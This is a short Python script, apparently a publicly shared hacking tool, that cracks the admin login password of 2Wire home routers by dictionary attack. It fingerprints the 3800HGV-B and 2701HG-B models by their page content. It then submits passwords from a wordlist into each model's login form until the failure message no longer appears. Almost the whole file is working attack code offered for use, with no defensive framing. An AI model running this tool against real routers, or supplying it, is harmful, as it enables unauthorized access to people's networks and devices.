#!/usr/bin/Python
#################################################
# 2Wire Dictionary Cracker						#
# By: Dennis Linuz <dennismald@gmail.com>		#
# Crack 2Wire router login passwords			#
#################################################
import mechanize, sys

#if len(sys.argv) != 4:
#	print 'Usage:\n\tpython 2Wire-Cracker.py <Router Login URL> <Wordlist>\n\nExample:\n\tpython 2Wire-Cracker.py "http://192.168.1.254/xslt?PAGE=C_0_1" "common_passwords.txt" "The password is incorrect."'
#	quit()

browser = mechanize.Browser()

def dictionaryAttack(routerUrl, inputName, failedText):
	file = open(wordlist,"r")
	html = browser.open(routerUrl).read()
	for word in file:
		word = word.replace("\n","")
		print "Trying: " + word
		browser.select_form(nr=0)
		browser.form[inputName] = word
		html = browser.submit().read()
		if not failedText in html:
			print "Password found: " + word
			break
	file.close()

routerAddress = "http://"+sys.argv[1]
wordlist = sys.argv[2]

versionCheck = browser.open(routerAddress).read()
if "3800HGV-B" in versionCheck:
	print "Router Version Found: 3800HGV-B"
	dictionaryAttack(routerAddress + "/xslt?PAGE=C_0_1", "ADM_PASSWORD", "Login failed")
elif "2701HG-B" in versionCheck:
	print "Router Version Found: 2701HG-B"
	dictionaryAttack(routerAddress + "/xslt?PAGE=A05", "PASSWORD", "The password is incorrect.")
else:
	print "Router version not found or supported... Stopping."	
